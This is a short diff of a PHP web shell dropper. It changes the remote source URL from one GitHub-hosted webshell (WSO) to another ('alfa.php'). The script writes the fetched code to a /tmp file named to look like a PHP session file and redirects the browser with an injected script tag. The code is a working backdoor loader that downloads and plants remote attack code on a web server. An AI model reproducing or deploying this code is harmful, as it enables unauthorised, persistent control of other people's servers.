@@ -1,5 +1,5 @@
 <?php
-$URL = 'https://raw.githubusercontent.com/psychoxploit/tmp-shell/master/wso/index.php'; #psychoxploit
+$URL = 'raw.githubusercontent.com/senada13/j7webshells/main/alfa.php';
 $TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php';
 
 function M() {
@@ -11,7 +11,7 @@ function M() {
 		fwrite($HANDLE, $FGT);
 		fclose($HANDLE);
 	}
-	echo '<script>window.location="?psychoxploit";</script>';
+	echo '<script>window.location="?j";</script>';
 }
 
 if(file_exists($TMP)) {
